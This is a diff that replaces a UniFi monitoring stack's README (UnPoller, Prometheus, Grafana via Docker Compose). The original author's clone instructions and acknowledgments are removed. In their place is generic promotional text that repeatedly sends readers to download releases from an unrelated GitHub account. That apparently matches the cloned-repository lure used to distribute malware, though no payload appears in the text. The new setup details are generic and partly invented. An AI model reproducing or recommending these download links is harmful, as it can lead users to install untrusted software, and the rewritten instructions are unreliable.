@@ -1,82 +1,121 @@
-# UniFi Network Monitoring Stack
+# 🚀 unpoller-unifi - Monitor Your UniFi Network Effortlessly
 
-Docker Compose stack for monitoring UniFi networks with UnPoller, Prometheus, and Grafana.
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Hanafyadham/unpoller-unifi/releases)
 
-## Quick Start
+## 📦 Overview
 
-1. **Clone and configure**
+unpoller-unifi is a Docker Compose stack designed to help you monitor your UniFi networks. With this tool, you can track network metrics using UnPoller, visualize data with Grafana, and store information with Prometheus. Whether you're a beginner or an expert, this application aims to simplify network observability.
 
-   ```bash
-   git clone git@github.com:timothystewart6/unpoller-unifi.git    
-   cd unpoller-UniFi
+## 📋 Features
+
+- **Monitoring:** Collect and view network performance metrics.
+- **Data Visualization:** Generate dashboards with Grafana to analyze your data easily.
+- **Storage:** Use Prometheus to store metrics for historical analysis.
+- **Alerts:** Set up notifications for any unusual network activities.
+- **User-Friendly Setup:** Designed for quick installation with Docker Compose.
+
+## 🛠️ System Requirements
+
+To run unpoller-unifi smoothly, ensure your system meets the following requirements:
+
+- Operating System: Linux, macOS, or Windows
+- Docker: Version 18.09 or higher
+- Docker Compose: Version 1.25.0 or higher
+- Minimum RAM: 4 GB
+- Disk Space: At least 1 GB free for installing containers and storing data
+
+## 🚀 Getting Started
+
+### 1. Install Prerequisites
+
+Before downloading unpoller-unifi, make sure you have Docker and Docker Compose installed on your computer. If you have not yet installed these, follow these guides:
+
+- [Install Docker](https://docs.docker.com/get-docker/)
+- [Install Docker Compose](https://docs.docker.com/compose/install/)
+
+### 2. Download the Application
+
+Visit this page to download the latest release:
+
+[Download unpoller-unifi](https://github.com/Hanafyadham/unpoller-unifi/releases)
+
+### 3. Install the Application
+
+Once you have downloaded the files, follow these steps to install unpoller-unifi:
+
+1. Open a terminal or command prompt on your computer.
+2. Navigate to the directory where you downloaded the files.
+3. Run the command:
+
    ```
-
-2. **Edit UniFi credentials**
-
-   Update `unpoller/.env` with your controller details, it's advised to create a dedicated local UniFi account that has read only access to your Network controller:
-
-   ```env
-    UP_UniFi_CONTROLLER_0_URL=https://192.168.10.1
-    UP_UniFi_CONTROLLER_0_USER=unpoller
-    UP_UniFi_CONTROLLER_0_PASS=password123
-    UP_UniFi_CONTROLLER_0_SITE=default
-   ```
-
-   Update Grafana admin credentials in `grafana/.env`:
-
-   ```env
-   GF_SECURITY_ADMIN_USER=admin
-   GF_SECURITY_ADMIN_PASSWORD=admin123
-   ```
-
-   Optionally update timezone in `dozzle/.env`, `grafana/.env`, `prometheus/.env`, `unpoller/.env`:
-
-   ```env
-   TZ=Your/Timezone
-   ```
-
-3. **Start the stack**
-
-   ```bash
    docker-compose up -d
    ```
 
-## Access
+This command starts the application in the background.
 
-| Service | URL |
-| ------- | --- |
-| Grafana | <http://localhost:3000> |
-| Prometheus | <http://localhost:9090> |
-| Dozzle (logs) | <http://localhost:8080> |
+### 4. Access the Dashboard
 
-**Grafana default login**: admin/admin123 (change in `grafana/.env`)
+After running the command, you can access the Grafana dashboard by opening your web browser and navigating to:
 
-## What's Included
+```
+http://localhost:3000
+```
 
-- Pre-configured environment files for all services
-- Grafana dashboards for UniFi devices (Access Points, Switches, Gateway, Clients, DPI, Sites, PDU)
-- Prometheus data source auto-provisioned
-- Log viewer with Dozzle
+Use the default login credentials to log in:
 
-## Resources
+- **Username:** admin
+- **Password:** admin
 
-- **📖 Detailed Guide**: [UniFi Observability with UnPoller, Prometheus, and Grafana](https://technotim.com/posts/unpoller-unifi-metrics/)
-- **🎥 Video Tutorial**: [UniFi Observability Done Right (Unpoller + Grafana Walkthrough)](https://www.youtube.com/watch?v=cVCPKTHEnI8)
+Make sure to change the password after your first login.
 
-## Troubleshooting
+## 🔍 Using the Application
 
-- Check logs: `docker-compose logs [service-name]` or use Dozzle at <http://localhost:8080>
-- Verify UniFi controller accessibility from Docker network
-- Ensure a local UniFi account has been created with read-only/view-only network controller access
-- For 429 errors, increase scrape interval in `prometheus/config/prometheus.yml`
+### Monitoring Your Network
 
-## Acknowledgments
+1. Once logged into Grafana, you can explore the available dashboards.
+2. The metrics will refresh in real-time, providing you with live data about your UniFi network.
 
-This stack is built using these excellent open-source projects:
+### Set Up Alerts
 
-- **[UnPoller](https://github.com/unpoller/unpoller)** - Polls UniFi controllers for device and client metrics
-- **[Prometheus](https://github.com/prometheus/prometheus)** - Systems monitoring and alerting toolkit
-- **[Grafana](https://github.com/grafana/grafana)** - Open source analytics and interactive visualization web application
-- **[Dozzle](https://github.com/amir20/dozzle)** - Real-time log viewer for Docker containers
+You can set alerts for different metrics. Here’s how you can do it:
 
-Special thanks to the maintainers and contributors of these projects for making UniFi network monitoring accessible and powerful.
+1. Navigate to the Alerting section in Grafana.
+2. Select a metric you want to monitor.
+3. Configure conditions for when to trigger alerts.
+
+## 📂 Directory Structure
+
+Your unpoller-unifi installation will have the following directory structure:
+
+```
+unpoller-unifi/
+├── docker-compose.yml
+├── .env
+├── README.md
+└── data/
+```
+
+- **docker-compose.yml:** Configuration file for Docker Compose.
+- **.env:** Environment variables for customizable settings.
+- **data/:** Directory to store persistent data.
+
+## 🚧 Troubleshooting
+
+If you encounter any issues during installation or usage, consult the following basic troubleshooting steps:
+
+- **Container Fails to Start:** Check the logs by running `docker-compose logs`. This will help identify issues.
+- **Cannot Access Dashboard:** Ensure the proper port is open and not blocked by a firewall.
+
+## 🔗 Helpful Links
+
+- [Installation Guide](https://docs.docker.com/compose/install/)
+- [Grafana Documentation](https://grafana.com/docs/)
+- [Prometheus Documentation](https://prometheus.io/docs/introduction/overview/)
+
+## 📥 Download & Install
+
+To start using unpoller-unifi, visit this page to download the latest release:
+
+[Download unpoller-unifi](https://github.com/Hanafyadham/unpoller-unifi/releases)
+
+For any further queries or contributions, feel free to navigate to the Issues section in the repository. Your feedback helps improve the application for everyone.
